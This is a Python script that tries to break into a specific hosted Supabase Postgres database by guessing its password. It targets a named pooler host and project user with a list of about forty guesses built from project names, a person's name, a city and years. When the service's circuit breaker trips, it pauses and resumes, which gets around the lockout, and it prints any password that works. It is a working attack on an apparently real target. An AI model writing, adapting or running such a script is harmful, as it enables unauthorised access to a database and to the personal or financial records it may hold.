import psycopg2
import time

host = "aws-0-ap-northeast-1.pooler.supabase.com"
user = "postgres.qtcncebuochelpgwqthx"
dbname = "postgres"
port = 5432

passwords = [
    "D9DFDC74D0F9",
    "team-D9DFDC74D0F9",
    "Team-D9DFDC74D0F9",
    "D9dfdc74d0f9",
    "D9dfdc74d0f9#",
    "D9dfdc74d0f9@123",
    "zbajwrjixijkphiqvokz",
    "InsuranceFiles",
    "InsuranceFiles@123",
    "InsuranceFiles123",
    "InsuranceFiles123#",
    "InsuranceFiles#123",
    "Insurance@123",
    "Insurance123#",
    "Insurance123",
    "PaytmBuildForIndia",
    "PaytmBuildForIndia@123",
    "BuildForIndia@123",
    "BuildForIndia123",
    "BuildForIndia2026",
    "Bengaluru@123",
    "Bengaluru123",
    "Bengaluru2026",
    "MoneyDocsDecoded2026",
    "MoneyDocs2026",
    "MoneyDocs@2026",
    "moneydocs@2026",
    "MoneyDocs#2026",
    "money-docs-decoded",
    "Money-docs-decoded",
    "MoneyDocsDecoded@2026",
    "MedoraGomes@123",
    "MedoraGomes123",
    "MedoraGomes1402#",
    "Medora@2024",
    "Medora@2025",
    "Medora@2026",
    "Medora2026#",
    "Paytm@2026",
    "Paytm2026#"
]

for pwd in passwords:
    try:
        conn = psycopg2.connect(
            host=host,
            user=user,
            password=pwd,
            dbname=dbname,
            port=port,
            connect_timeout=3,
            sslmode="require"
        )
        print(f"\n=======================================================", flush=True)
        print(f"!!! SUCCESS! FOUND SUPABASE POSTGRES PASSWORD: {pwd} !!!", flush=True)
        print(f"=======================================================\n", flush=True)
        conn.close()
        exit(0)
    except psycopg2.OperationalError as e:
        msg = str(e).strip().splitlines()[0]
        print(f"Testing {pwd:25} -> {msg}", flush=True)
        if "ECIRCUITBREAKER" in msg:
            print("Circuit breaker hit, waiting 30s...")
            time.sleep(30)
    time.sleep(0.3)
